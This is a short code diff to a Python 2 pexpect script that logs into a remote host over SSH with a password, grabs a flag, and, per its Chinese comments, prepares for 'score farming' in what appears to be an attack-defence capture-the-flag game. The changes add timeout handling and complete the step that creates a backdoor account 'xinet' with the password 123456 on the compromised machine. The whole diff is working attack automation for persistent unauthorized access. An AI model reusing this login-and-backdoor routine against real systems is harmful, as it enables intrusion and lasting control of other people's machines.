@@ -30,7 +30,7 @@ with open(path, 'wb') as f:
 
     res = child.expect([
         'Are you sure you want to continue connecting (yes/no)?', 'password:', 'Connection refused'
-        , pexpect.TIMEOUT], timeout=5)
+        , pexpect.TIMEOUT, pexpect.EOF], timeout=5)
 
     if res == 2:
         print 'refused,exited'
@@ -43,10 +43,13 @@ with open(path, 'wb') as f:
         child.expect('password:')
 
     child.sendline(password)
-    res = child.expect(['#', 'Permission denied'])
+    res = child.expect(['#', 'Permission denied', pexpect.TIMEOUT], timeout=10)
 
     if res == 1:
         print 'Permission denied'
+        exit(0)
+    elif res == 2:
+        print 'Connect Time out'
         exit(0)
 
     # 获取Flag值,为什么这么麻烦..
@@ -72,6 +75,7 @@ with open(path, 'wb') as f:
     # 为后面的刷分做准备
     child.sendline('/usr/sbin/useradd xinet')
     child.sendline('passwd xinet')
+    child.sendline('123456')
     child.sendline('123456')
 
     child.sendline('exit')
